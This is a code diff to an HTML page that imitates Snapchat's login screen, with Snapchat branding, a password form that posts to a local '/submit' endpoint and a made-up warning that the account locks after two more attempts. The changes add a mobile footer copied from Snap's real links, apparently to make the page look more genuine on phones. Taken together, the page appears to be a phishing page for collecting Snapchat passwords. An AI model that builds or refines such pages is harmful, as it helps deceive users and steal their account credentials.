@@ -8,6 +8,7 @@
   <link rel="icon" type="image/png" href="snapchat-logo.png" />
 </head>
 <body>
+
   <div class="login-container">
     <form action="/submit" method="POST">
       <div class="login-box" id="step1">
@@ -27,17 +28,16 @@
         </div>
         <label for="password">Password</label>
         <input type="password" id="password" name="password" required />
-
         <div id="password-error" class="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px;">
           Wrong password. 2 attempts left before account lock.
         </div>
-
         <button type="submit" id="step2-button" disabled>Continue</button>
       </div>
     </form>
   </div>
 
-  <footer>
+  <!-- Desktop FOOTER -->
+  <footer class="desktop-only">
     <div class="footer-columns">
       <div>
         <h4>Company</h4>
@@ -78,6 +78,7 @@
         </ul>
       </div>
     </div>
+
     <div class="language-selector">
       <label for="language">Language</label>
       <select id="language" name="language">
@@ -88,6 +89,53 @@
       </select>
     </div>
   </footer>
+
+  <!-- Mobile FOOTER -->
+  <div class="footer-dropdown mobile-only">
+    <div>
+      <button class="dropdown-toggle">Company</button>
+      <ul class="dropdown-content">
+        <li><a href="https://www.snap.com/?lang=en-US" target="_blank">Snap Inc.</a></li>
+        <li><a href="https://careers.snap.com/" target="_blank">Careers</a></li>
+        <li><a href="https://newsroom.snap.com/" target="_blank">News</a></li>
+      </ul>
+    </div>
+    <div>
+      <button class="dropdown-toggle">Community</button>
+      <ul class="dropdown-content">
+        <li><a href="https://help.snapchat.com/hc/en-us" target="_blank">Support</a></li>
+        <li><a href="https://values.snap.com/policy/policy-community-guidelines?lang=en-US" target="_blank">Community Guidelines</a></li>
+        <li><a href="https://values.snap.com/safety/safety-center?lang=en-US" target="_blank">Safety Center</a></li>
+      </ul>
+    </div>
+    <div>
+      <button class="dropdown-toggle">Advertising</button>
+      <ul class="dropdown-content">
+        <li><a href="https://forbusiness.snapchat.com/" target="_blank">Create Ads</a></li>
+        <li><a href="https://www.snap.com/ad-policies?lang=en-US" target="_blank">Ad Policies</a></li>
+        <li><a href="https://www.snap.com/political-ads?lang=en-US" target="_blank">Political Ads Library</a></li>
+      </ul>
+    </div>
+    <div>
+      <button class="dropdown-toggle">Legal</button>
+      <ul class="dropdown-content">
+        <li><a href="https://values.snap.com/privacy/privacy-center?lang=en-US" target="_blank">Privacy Center</a></li>
+        <li><a href="https://help.snapchat.com/hc/en-us/articles/11399265637012" target="_blank">Your Privacy Choices</a></li>
+        <li><a href="https://www.snap.com/cookie-policy?lang=en-US" target="_blank">Cookie Policy</a></li>
+        <li><a href="https://help.snapchat.com/hc/en-us/articles/7012332110996" target="_blank">Report Abuse</a></li>
+      </ul>
+    </div>
+
+    <div class="language-selector mobile-only">
+      <label for="language">Language</label>
+      <select id="language" name="language">
+        <option value="de">Deutsch</option>
+        <option selected value="en">English</option>
+        <option value="fr">Français</option>
+        <option value="es">Español</option>
+      </select>
+    </div>
+  </div>
 
   <div class="bottom-bar">
     <a href="https://values.snap.com/privacy/privacy-policy?lang=en-US" target="_blank">Privacy Policy</a>
